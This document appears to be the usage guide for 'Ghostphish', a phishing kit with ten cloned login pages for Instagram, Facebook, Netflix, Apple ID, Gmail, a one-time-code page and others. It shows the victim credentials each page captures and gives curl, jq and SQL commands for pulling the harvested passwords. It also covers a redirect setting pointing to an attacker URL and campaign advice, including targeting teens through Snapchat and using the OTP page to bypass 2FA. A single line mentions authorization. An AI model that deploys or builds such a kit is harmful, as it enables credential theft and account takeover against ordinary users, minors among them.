# Ghostphish - Template Guide

Complete guide to using Ghostphish's multiple phishing page templates.

## Available Templates

Ghostphish includes 10 pre-built phishing templates for the most popular services:

| Template | Service | Auth Method | Dark Mode |
|----------|---------|-------------|-----------|
| **instagram** | Instagram | Email/Password | No |
| **facebook** | Facebook | Email/Password | No |
| **netflix** | Netflix | Email/Password | Yes |
| **snapchat** | Snapchat | Email/Password | No |
| **twitter** | Twitter/X | Email/Password | No |
| **linkedin** | LinkedIn | Email/Password | No |
| **amazon** | Amazon | Email/Password | No |
| **apple** | Apple ID | Email/Password | No |
| **gmail** | Gmail | Email/Password | No |
| **otp** | Generic OTP | 6-digit Code | No |

---

## Quick Access

### Landing Page
Open the template selector:
```
http://localhost:8000/
```

Shows all 10 templates in a grid. Click any to open that phishing page.

### Direct Links
Access templates directly by service name:

```bash
# Instagram
http://localhost:8000/instagram

# Facebook
http://localhost:8000/facebook

# Netflix
http://localhost:8000/netflix

# Snapchat
http://localhost:8000/snapchat

# Twitter/X
http://localhost:8000/twitter

# LinkedIn
http://localhost:8000/linkedin

# Amazon
http://localhost:8000/amazon

# Apple ID
http://localhost:8000/apple

# Gmail
http://localhost:8000/gmail

# OTP (generic)
http://localhost:8000/otp
```

---

## Captured Data by Template

Each template captures different fields:

### Social Media (Instagram, Facebook, Snapchat, Twitter)
```json
{
  "service": "instagram",
  "email": "victim@gmail.com",
  "password": "their_password",
  "timestamp": "2026-08-12T10:21:00...",
  "ip_address": "192.168.1.100",
  "user_agent": "Mozilla/5.0...",
  "attempt_number": 1
}
```

### Streaming (Netflix)
```json
{
  "service": "netflix",
  "email": "subscriber@email.com",
  "password": "netflix_password",
  "timestamp": "2026-08-12T10:21:00...",
  "ip_address": "192.168.1.100",
  "attempt_number": 1
}
```

### Professional (LinkedIn)
```json
{
  "service": "linkedin",
  "email": "professional@company.com",
  "password": "linkedin_password",
  "timestamp": "2026-08-12T10:21:00...",
  "ip_address": "192.168.1.100",
  "attempt_number": 1
}
```

### E-Commerce (Amazon)
```json
{
  "service": "amazon",
  "email": "shopper@email.com",
  "password": "amazon_password",
  "timestamp": "2026-08-12T10:21:00...",
  "ip_address": "192.168.1.100",
  "attempt_number": 1
}
```

### Identity (Apple ID, Gmail)
```json
{
  "service": "apple",
  "email": "user@icloud.com",
  "password": "apple_id_password",
  "timestamp": "2026-08-12T10:21:00...",
  "ip_address": "192.168.1.100",
  "attempt_number": 1
}
```

### OTP Verification
```json
{
  "service": "otp",
  "email": "user@example.com",
  "otp": "123456",
  "timestamp": "2026-08-12T10:21:00...",
  "ip_address": "192.168.1.100",
  "attempt_number": 1
}
```

---

## Analysis by Template

### View Captures by Service
```bash
# Get all captures with service breakdown
curl http://localhost:8000/admin/captures | jq '.captures[] | {service, email}'

# Count by service
curl http://localhost:8000/admin/captures | jq -r '.captures[].service' | sort | uniq -c

# Example output:
#   1 instagram
#   2 facebook
#   1 netflix
#   3 linkedin
```

### Export by Service
```bash
# Export to JSON
cd /home/redteam/ghostphish
python export_captures.py json

# Filter by service in JSON
jq '.[] | select(.service=="instagram")' captures_*.json

# Export to CSV and filter
python export_captures.py csv
grep facebook captures_*.csv
```

### SQL Queries
```bash
sqlite3 ./data/captures.db

# Count by service
SELECT service, COUNT(*) as count FROM captures GROUP BY service;

# Get all Instagram captures
SELECT email, password FROM captures WHERE service = 'instagram';

# Get captures by date and service
SELECT timestamp, service, email FROM captures 
WHERE service IN ('facebook', 'instagram')
ORDER BY timestamp DESC;

# Get unique emails per service
SELECT service, COUNT(DISTINCT email) as unique_users 
FROM captures GROUP BY service;
```

---

## Template Features

### Instagram
- 📱 Responsive mobile-first design
- 🎨 Instagram brand colors
- ✓ Username/email and password fields
- 🔄 "Forgot password?" link
- 🔗 Signup redirect option

### Facebook
- 🌐 Classic Facebook layout
- 📋 Left sidebar branding
- ✓ Email/phone and password
- 🔗 "Create account" CTA
- 🔐 Forgot password link

### Netflix
- 🌙 Dark theme design
- 🎬 Premium look & feel
- ✓ Email/phone and password
- 📺 "Sign up" redirect
- ℹ️ Help/support links

### Snapchat
- 👻 Yellow gradient background
- 📸 Snapchat ghost logo
- ✓ Email/username and password
- ✨ Modern button design
- 🔗 Signup/forgot password

### Twitter/X
- 🔤 Minimalist X (formerly Twitter) layout
- ⚫ Black/white theme
- ✓ Phone/email/username and password
- 📢 "Happening now" branding
- 🚀 Sign-up option

### LinkedIn
- 💼 Professional design
- 🔵 LinkedIn brand blue
- ✓ Email/phone and password
- 📊 Professional tagline
- 🔐 Forgot password support

### Amazon
- 🛒 E-commerce layout
- 🔶 Amazon yellow accent
- ✓ Email and password
- 💳 Trusted payment partner feel
- 🔑 Forgotten password recovery

### Apple ID
- 🍎 Minimalist Apple design
- ⚪ Clean white background
- ✓ Apple ID (email) and password
- 🔐 Forgot Apple ID option
- 🛡️ Privacy/security focus

### Gmail
- 🔵 Google brand colors
- 📧 Clean, simple layout
- ✓ Email and password
- 🔍 Google account branding
- 🔐 Forgot password link

### OTP (Generic)
- 🔐 Generic email verification
- 📱 OTP input (6 digits)
- ✓ Email field
- ⏱️ OTP resend option
- 🎨 Purple gradient design

---

## Customization

### Change Redirect URL

Edit `app.py` and modify the `redirects` dictionary in `/submit` endpoint:

```python
redirects = {
    "instagram": "https://your-attacker-url.com/instagram",
    "facebook": "https://your-attacker-url.com/facebook",
    # ... etc
}
```

### Customize Template HTML

Each template is defined as an HTML string in `app.py`. To modify:

1. Find the endpoint (e.g., `@app.get("/instagram")`)
2. Edit the HTML in the return statement
3. Rebuild: `docker-compose build --no-cache && docker-compose up -d`

### Common Customizations
- Change button text
- Modify colors/branding
- Add additional form fields
- Change redirect behavior
- Update error messages

---

## Testing Templates

### cURL Test
```bash
# Test Instagram
curl -X POST http://localhost:8000/submit \
  -H "Content-Type: application/json" \
  -d '{
    "service": "instagram",
    "email": "test@gmail.com",
    "password": "testpass123",
    "honeypot": ""
  }'
```

### Browser Test
1. Open `http://localhost:8000`
2. Click any template
3. Submit test credentials
4. Verify capture in `/admin/captures`

### Rate Limit Test
```bash
# Submit 5+ times rapidly
for i in {1..6}; do
  curl -X POST http://localhost:8000/submit \
    -H "Content-Type: application/json" \
    -d '{"service":"instagram","email":"test@email.com","password":"pass"}'
done
# 6th attempt should be blocked (429 Too Many Requests)
```

---

## Engagement Checklist (by Template)

### Pre-Engagement
- [ ] Authorization includes this specific service
- [ ] Target users identified
- [ ] Email template ready
- [ ] Redirect URL appropriate
- [ ] Landing page customized (if needed)

### During Campaign
- [ ] Monitor captures in real-time
- [ ] Check `/admin/captures` endpoint
- [ ] Track click-through rate
- [ ] Watch for rate limiting triggers
- [ ] Document suspicious activity

### Post-Campaign
- [ ] Export all captures: `python export_captures.py csv`
- [ ] Analyze by service: `jq '.[] | .service' captures_*.json | sort | uniq -c`
- [ ] Calculate metrics (CTR, submission rate)
- [ ] Clear data: `python cleanup.py clear`
- [ ] Generate report with findings

---

## Security Notes

⚠️ **Honeypot Detection**
- Hidden form field catches automated tools
- Logged to database even if filled
- Allows distinguishing bots from real users

⚠️ **Rate Limiting (per IP)**
- 5 attempts per IP, then 5-min lockout
- Prevents brute-force enumeration
- Resets after lockout period expires

⚠️ **Data Storage**
- Credentials stored in plaintext (SQLite)
- Use HTTPS in production
- Hash/encrypt passwords (recommended)
- Secure database file permissions

---

## Advanced Queries

### Get credentials by service for report
```bash
sqlite3 ./data/captures.db
SELECT service, COUNT(*) as captures, 
       COUNT(DISTINCT email) as unique_users
FROM captures GROUP BY service ORDER BY captures DESC;
```

### Timeline analysis
```bash
# When were captures made?
SELECT service, datetime(timestamp), email FROM captures ORDER BY timestamp DESC;
```

### Repeat attempts analysis
```bash
# Which users tried multiple times?
SELECT email, service, COUNT(*) as attempts 
FROM captures GROUP BY email, service HAVING attempts > 1;
```

### IP analysis
```bash
# Captures by IP address
SELECT ip_address, COUNT(*) as captures, COUNT(DISTINCT service) as services
FROM captures GROUP BY ip_address;
```

---

## Template Metrics

Each template provides unique insights into user behavior:

- **Instagram/Facebook**: Social engineering on social networks
- **Netflix**: Credential stuffing for streaming services
- **LinkedIn**: Professional compromise targeting
- **Amazon**: E-commerce fraud/compromise
- **Apple/Gmail**: Identity compromise (high-value targets)
- **Twitter**: Public account compromise
- **Snapchat**: Teen/young adult targeting
- **OTP**: 2FA bypass effectiveness

---

## Tips & Tricks

✅ **Best Practices**
- Use landing page for random template distribution
- Customize per-target with different templates
- Mix templates in same campaign for diversity
- Track success by template type
- Consider industry/target profile when selecting

✅ **Engagement Tips**
- Instagram works well for B2C campaigns
- LinkedIn targets professionals/business users
- Netflix appeals to subscription users
- Apple/Gmail = high-value identity targets
- Twitter = public account compromise

---

**Remember**: Always use authorized and documented in Rules of Engagement.
Last updated: 2026-08-12
